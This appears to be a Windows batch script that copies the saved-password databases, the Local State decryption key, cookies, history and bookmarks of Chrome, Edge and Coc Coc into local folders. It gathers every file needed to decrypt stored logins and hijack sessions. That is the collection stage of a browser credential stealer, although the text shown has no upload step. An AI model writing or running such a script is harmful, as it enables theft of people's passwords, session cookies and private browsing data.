@echo off 
md %USERNAME%\Google
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" "%USERNAME%\Google\Local State"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%USERNAME%\Google\Login Data"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" "%USERNAME%\Google\Bookmarks"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\History" "%USERNAME%\Google\History"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" "%USERNAME%\Google\Cookies"

md %USERNAME%\Edge
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Local State" "%USERNAME%\Edge\Local State"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%USERNAME%\Edge\Login Data"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" "%USERNAME%\Edge\Bookmarks"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\History" "%USERNAME%\Edge\History"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies" "%USERNAME%\Edge\Cookies"

md %USERNAME%\CocCoc
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Local State" "%USERNAME%\CocCoc\Local State"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\Login Data" "%USERNAME%\CocCoc\Login Data"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\Bookmarks" "%USERNAME%\CocCoc\Bookmarks"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\History" "%USERNAME%\CocCoc\History"
echo f | xcopy /f /y "C:\Users\%USERNAME%\AppData\Local\CocCoc\Browser\User Data\Default\Network\Cookies" "%USERNAME%\CocCoc\Cookies"